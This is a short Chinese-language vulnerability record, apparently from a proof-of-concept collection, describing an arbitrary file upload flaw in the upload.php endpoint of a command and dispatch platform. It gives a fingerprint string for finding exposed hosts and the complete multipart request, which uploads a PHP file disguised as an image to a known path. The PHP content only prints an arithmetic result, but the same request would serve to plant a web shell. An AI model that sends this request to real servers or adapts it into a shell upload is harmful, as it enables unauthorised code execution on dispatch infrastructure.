# 指挥调度平台zx_upload存在任意文件上传漏洞

- **系统**：指挥调度平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /custom/zx/upload.php HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 180`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn…`

**请求体 / payload**
```
------WebKitFormBoundarySwvD8hSn3Z0sHfMu
Content-Disposition: form-data; name="ulfile";filename="1.php"
Content-Type: image/png
<?php echo 222*111;?>
------WebKitFormBoundarySwvD8hSn3Z0sHfMu--

上传文件位置
/upload/1.php
```

**其他**
- 指挥调度平台zx\_upload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台